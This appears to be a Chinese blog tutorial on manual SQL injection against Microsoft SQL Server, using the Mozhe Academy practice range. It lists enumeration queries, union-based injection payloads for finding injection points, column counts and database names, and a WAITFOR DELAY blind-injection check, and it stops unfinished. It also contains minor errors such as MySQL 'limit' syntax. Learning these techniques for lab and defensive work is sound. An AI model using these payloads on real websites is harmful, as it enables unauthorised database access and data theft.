---
layout: post
title: Sql-Server数据库手工注入
date: 2024-08-20 19:24:25 +0800
categories: [web渗透方法论]
tags: []
image:
    path: https://img-blog.csdnimg.cn/20210613162148763.png?x-oss-process&#61;image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70
    alt: Sql-Server数据库手工注入
artid: 117867431
render_with_liquid: false
---
<p class="artid" style="display:none">$url</p>
<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     Sql Server数据库手工注入
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <p id="main-toc">
     <strong>
      目录
     </strong>
    </p>
    <p id="Sql%20Server-toc" style="margin-left:40px;">
     <a href="#Sql%20Server" rel="nofollow">
      Sql Server
     </a>
    </p>
    <p id="SQLServer%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0-toc" style="margin-left:40px;">
     <a href="#SQLServer%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0" rel="nofollow">
      Sql Server数据库的查询语句
     </a>
    </p>
    <p id="union%E6%B3%A8%E5%85%A5-toc" style="margin-left:80px;">
     <a href="#union%E6%B3%A8%E5%85%A5" rel="nofollow">
      union注入
     </a>
    </p>
    <p id="%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5-toc" style="margin-left:80px;">
     <a href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5" rel="nofollow">
      延时注入
     </a>
    </p>
    <hr id="hr-toc"/>
    <p>
     这里感谢墨者学院提供的靶场：
     <a href="https://www.mozhe.cn/bug/detail/90" rel="nofollow">
      https://www.mozhe.cn/bug/detail/90
     </a>
    </p>
    <h3 id="Sql%20Server">
     <span style="color:#3399ea;">
      Sql Server
     </span>
    </h3>
    <p>
     <span style="color:#7c79e5;">
      <strong>
       SQL Server
      </strong>
     </span>
     数据库是由Microsoft开发和推广的关系数据库管理系统(DBMS)，是一个比较大型的数据库。端口号为
     <strong>
      1433
     </strong>
     。数据库后缀名 .mdf，注释符是 -- 。
    </p>
    <p>
     <strong>
      QLServer有三个权限级别：
     </strong>
    </p>
    <ul>
     <li>
      sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限
     </li>
     <li>
      db权限：文件管理，数据库操作等权限 users-administrators
     </li>
     <li>
      public权限：数据库操作 guest-users
     </li>
    </ul>
    <p>
     断当前用户权限
    </p>
    <pre><code class="language-sql">判断是否是SA权限
select is_srvrolemember('sysadmin')     
判断是否是db_owner权限  
select is_member('db_owner')
判断是否是public权限
select is_srvrolemember('public')</code></pre>
    <p>
     SQLServer数据库有6个默认的库，分别是4个系统数据库：
     <span style="color:#f33b45;">
      master
     </span>
     、
     <span style="color:#f33b45;">
      model
     </span>
     、
     <span style="color:#f33b45;">
      msdb
     </span>
     、
     <span style="color:#f33b45;">
      tempdb
     </span>
     ，和2个实例数据库：
     <span style="color:#f33b45;">
      ReportServer
     </span>
     、
     <span style="color:#f33b45;">
      ReportServerTempDB
     </span>
     。其中，系统数据库 model 和 tempdb 默认是没有数据表的。
    </p>
    <p>
     master数据库：master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。
     <br/>
     model数据库：model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。
     <br/>
     msdb数据库：msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。
     <br/>
     tempdb数据库：tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。
    </p>
    <p>
     <img alt="" height="207" src="https://i-blog.csdnimg.cn/blog_migrate/0a2fa0b527d87c30262aa2abe07444b3.png" width="425"/>
    </p>
    <p>
     但是如果用navicat远程连接的话，只会显示2个实例数据库：
     <span style="color:#f33b45;">
      ReportServer
     </span>
     、
     <span style="color:#f33b45;">
      ReportServerTempDB
     </span>
    </p>
    <h3 id="SQLServer%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0">
     <span style="color:#3399ea;">
      Sql Server数据库的查询语句
     </span>
    </h3>
    <pre><code class="language-bash">select @@version;       #查询数据库的版本
select @@servername;    #查询服务名
select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字
select db_name();       #查询当前数据库名
select db_name(1);      #查询第一个数据库名
select db_name(2);      #查询第二个数据库名
select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner 
use tempdb              #切换到tempdb表  
top n                   #查询前n条记录
limit 2,3               #查询第2条开始的3条数据，也就是2,3,4
select substring('string',2,1)     #截取给定字符串的索引为2的1个字符
select ascii('a')                  #查询给定字符串的ascii值
select len('string')               #查询给定字符串的长度
EXEC sp_spaceused @updateusage = N'TRUE';  #查询当前数据库的大小
sp_spaceused '表名'                #查询指定表名的大小
 
判断是否是SA权限
select is_srvrolemember('sysadmin')     
判断是否是db_owner权限  
select is_member('db_owner')
判断是否是public权限
select is_srvrolemember('public')
 
#数据库的连接
server=127.0.0.1;UID=sa;PWD=123456;database=master;Provider=SQLOLEDB
mssql://sa:123456@127.0.0.1/XCCMS_SocialBusinessDB
 
count(name)是查询总数
name是查询名字
*是查询详细信息
 
#查询数据库
select count(name) from sysdatabases     #查询数据库的个数,只有当前数据库是master的时候，才能执行该命令
select name  from sysdatabases           #查询数据库的名字
select * from sysdatabases               #查询所有数据库的信息
 
#查询数据表
select count(name) from sysobjects where type='U' #查询当前数据库中表的个数
select name from sysobjects where type='U'  #查询当前数据库中所有表的名字
select * from sysobjects where type='U'    #查询当前数据库的所有表的详细信息
 
select count(name) from test..sysobjects where xtype='U'  #查询指定test数据库中表的个数
select name from test..sysobjects where xtype='U'         #查询指定test数据库中表的名字
select * from test..sysobjects where xtype='U'            #查询指定test数据库中表的详细信息
 
#查询列
select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')            #查询当前数据库的指定users表的列的个数
select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')         #查询当前数据库的指定users表的所有列的名字
select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')      #查询当前数据库的指定users表的列的详细信息
 
select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')     #查询指定test数据库的指定users表的列的个数
select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')       #查询指定test数据库的指定users表的所有列的名字
select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')       #查询指定test数据库的指定users表的列的详细信息
 
#查询数据
select count(*) from test..users          #查询test数据库user表的数据的条数
select * from test..users                 #查询test数据库user表的所有数据</code></pre>
    <h4 id="union%E6%B3%A8%E5%85%A5">
     <span style="color:#e579b6;">
      union注入
     </span>
    </h4>
    <p>
     页面如下，先寻找注入点，点击如下通知
     <img alt="" height="399" src="https://i-blog.csdnimg.cn/blog_migrate/b428b483368cc782710cbd3e47be6b86.png" width="917"/>
    </p>
    <p>
     进入到新的页面
    </p>
    <p>
     <img alt="" height="327" src="https://i-blog.csdnimg.cn/blog_migrate/92ca71ca497643f976b8bae064f7ad3f.png" width="737"/>
    </p>
    <p>
     1. 判断注入点
    </p>
    <pre><code>http://219.153.49.228:45266/new_list.asp?id=2'  报错
http://219.153.49.228:45266/new_list.asp?id=2 and 1=1   正常显示（后面可以加--+也可以不加）
http://219.153.49.228:45266/new_list.asp?id=2 and 1=2   不正常显示</code></pre>
    <p>
     由此猜测后台的sql语句如下
    </p>
    <pre><code class="language-sql">$sql= "select * from test where id=".$id;</code></pre>
    <p>
     2. 判断数据库类型
    </p>
    <pre><code class="language-sql">//判断是否是 Mysql数据库
and exists(select*from information_schema.tables)
//判断是否是 access数据库
and exists(select*from msysobjects)
//判断是否是 Sqlserver数据库
and exists(select*from sysobjects)</code></pre>
    <p>
     判断出数据库为sqlserver
    </p>
    <p>
     <img alt="" height="255" src="https://i-blog.csdnimg.cn/blog_migrate/2719ded5ed9af4ba9d7a146bf0f03e0b.png" width="710">
      <br/>
      3. 判断字段数
     </img>
    </p>
    <pre><code class="language-sql">首先order by查看有几列
?id=2 order by 2  正常显示
?id=2 order by 3  不正常显示
?id=2 order by 4  正常显示
?id=2 order by 5  不正常显示
?id=2 order by 6  后面的都不正常显示
说明有4列</code></pre>
    <p>
     判断回显
    </p>
    <pre><code>?id=-2 union all select '22','33','44','55'     #这里的数字为什么要加引号才行了？</code></pre>
    <p>
     <img alt="" height="254" src="https://i-blog.csdnimg.cn/blog_migrate/30d48c02f1745feb04fd295385bcfbb3.png" width="680"/>
    </p>
    <p>
     4. 判断数据库名
    </p>
    <pre><code>?id=-2 union all select '22','33',db_name(),'55'       #查询当前数据库名
?id=-2 union all select '22','33',db_name(1),'55'
?id=-2 union all select '22','33',db_name(2),'55'
?id=-2 union all select '22','33',db_name(3),'55'
?id=-2 union all select '22','33',db_name(4),'55'</code></pre>
    <p>
     <img alt="" height="250" src="https://i-blog.csdnimg.cn/blog_migrate/f8dde7c6a57083f7a7baf21c97766a21.png" width="698"/>
    </p>
    <p>
     mozhe_db_v2、master、tempdb、model、msdb
    </p>
    <p>
     5. 查询数据库中表的个数
    </p>
    <p>
     查询mozhe_db_v2数据库中表的个数
    </p>
    <pre><code class="language-sql">union all select 1,(select top 1 name from 数据库名.sysobjects where type='u'),'3',4</code></pre>
    <p>
     <img alt="" height="214" src="https://i-blog.csdnimg.cn/blog_migrate/980366791ba36d6dfa207669f87654f1.png" width="865"/>
    </p>
    <p>
     未完~
    </p>
    <h4 id="%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5">
     <span style="color:#e579b6;">
      延时注入
     </span>
    </h4>
    <p>
     延时命令：
     <span style="color:#86ca5e;">
      WAITFOR  DELAY  '0:0:n'
     </span>
     (n代表秒)
    </p>
    <p>
     WAITFOR是SQL Server中Transact-SQL提供的一个流程控制语句。它的作用就是等待特定时间，然后继续执行后续的语句。它包含一个参数DELAY，用来指定等待的时间。如果将该语句成功注入后，会造成数据库返回记录和Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注入成功。根据Web请求是否有延迟，渗透测试人员就可以判断网站是否存在注入漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测方法。
    </p>
    <p>
     成功延时4秒进行响应
    </p>
    <p>
     <img alt="" height="165" src="https://i-blog.csdnimg.cn/blog_migrate/ce6801689a85512f306e0e7f42f87a6a.png" width="781"/>
    </p>
    <p>
     由于WAITFOR不是SQL的标准语句，所以它只适用于
     <span style="color:#7c79e5;">
      SQL Server
     </span>
     数据库。
    </p>
    <p>
     参考 ：
    </p>
    <p>
     <a href="https://www.jianshu.com/p/d635ae330549" rel="nofollow">
      https://www.jianshu.com/p/d635ae330549
     </a>
    </p>
    <p>
     <a href="https://blog.csdn.net/qq_36119192/article/details/88679754">
      https://blog.csdn.net/qq_36119192/article/details/88679754
     </a>
    </p>
   </div>
  </div>
 </article>
</div>


